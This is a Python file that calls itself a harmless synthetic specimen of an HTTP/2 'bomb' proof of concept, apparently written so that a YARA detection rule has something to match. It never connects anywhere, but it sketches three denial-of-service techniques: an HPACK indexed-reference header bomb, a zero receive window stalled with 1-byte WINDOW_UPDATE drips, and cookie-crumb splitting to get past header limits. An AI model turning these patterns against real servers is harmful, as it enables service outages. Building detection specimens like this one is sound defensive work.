#!/usr/bin/env python3
"""
Synthetic specimen: minimal shape of the HTTP/2 Bomb PoC.
HPACK Indexed Reference Bomb + zero receive window + 1-byte WINDOW_UPDATE drip.
SAFE — does not connect to anything; only contains the structural code shape
that the YARA rule keys on.
"""

import h2.connection
import h2.config

# HPACK dynamic table seeded with one large header, then thousands of indexed
# references to it. The indexed-reference bomb pattern is the headline:
TECHNIQUE = "HPACK Indexed Reference Bomb"

def build_bomb(conn):
    # 1) Seed the dynamic table
    conn.send_headers(stream_id=1, headers=[
        ("x-very-long-header", "A" * 4000),
    ], end_stream=False)
    # 2) Emit thousands of 1-byte indexed references that resolve to the seed
    for _ in range(10_000):
        conn.send_headers(stream_id=1, headers=[("x-very-long-header", "")])

def stall(conn):
    # Advertise a zero-byte receive window so server can never finish sending
    initial_window_size = 0
    conn.local_settings.update({"SETTINGS_INITIAL_WINDOW_SIZE": initial_window_size})
    # Drip WINDOW_UPDATE 1 to keep the send timeout from firing
    for _ in range(100_000):
        conn.increment_flow_control_window(1)  # generates WINDOW_UPDATE 1

def cookie_crumb_bypass(headers):
    # RFC 9113 §8.2.3 allows splitting Cookie into one field per crumb;
    # many servers don't count cookie crumbs against per-field limits.
    cookies = [("cookie", f"k{i}=v") for i in range(8192)]
    return headers + cookies

if __name__ == "__main__":
    print("PRI * HTTP/2.0\\r\\n\\r\\nSM\\r\\n\\r\\n")
